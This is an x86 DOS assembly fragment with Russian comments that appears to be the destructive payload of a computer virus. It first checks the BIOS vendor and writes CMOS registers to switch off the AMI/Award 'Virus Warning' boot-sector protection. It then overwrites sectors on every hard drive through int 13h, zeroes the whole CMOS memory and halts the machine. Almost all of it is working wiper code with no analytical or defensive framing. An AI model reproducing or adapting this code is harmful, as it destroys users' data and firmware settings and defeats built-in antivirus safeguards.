DeadUser:	push 0F000h	;BIOS segment
		pop es
		xor di,di	;смещение 0

		push cs
		pop ds

		mov  cx,0FFFFh
CheckBIOS:	push di
		push cx
		mov si,offset Award
		add si,bp
		mov cx,5	;размер строки
		repe cmpsb
		pop cx
		pop di
		jz ItsAward
		inc di
		loop CheckBIOS

AMI:		mov al,34h	;если не AWARD, то AMI
		out 70h,al
		jmp short $+2
		xor al,al
		out 71h,al
		jmp Kill

ItsAward:	mov al,3Ch	;снимаем Virus Warning в AMI и AWARD BIOS
		out 70h,al
		jmp short $+2
		mov al,80h
		out 71h,al


;----------------------- Kill ALL disks ---------------------------------------
Kill:		mov dl,80h
NextDrive:	push dx
		mov ah,8
		int 13h
		pop ax
		cmp dl,al
		je KillCMOS

		mov dl,al

		and dh,3Fh
		mov byte ptr ds:[bp+offset NextHead+2],dh
		mov byte ptr ds:[bp+LowCyl],ch
		mov ch,cl
		and ch,0C0h
		inc ch
		mov byte ptr ds:[bp+HighCyl],ch
		and cl,3Fh
		mov byte ptr ds:[bp+offset Sector+1],cl

		jmp $+2

		xor dh,dh	;Head 0
		xor bx,bx
Head:		mov cx,1

Sector:		mov ax,300h	;write sectors
		int 13h

		add ch,1
		jnc Low8Bit
		add cl,40h
Low8Bit:	jc NextHead

HighCyl EQU $+2
		cmp cl,0
		jb Sector
LowCyl EQU $+2
		cmp ch,0
		jbe Sector

NextHead:	cmp dh,0
		jae NextDisk
		inc dh
		jmp Head

NextDisk:	inc dl
		jmp NextDrive

KillCMOS:	mov cx,80h		;убить CMOS...
CMOS:		mov al,cl
		out 70h,al
		jmp short $+2
		xor al,al
		out 71h,al
		loop CMOS		;CMOS - DEAD

Killed:		cli
		hlt
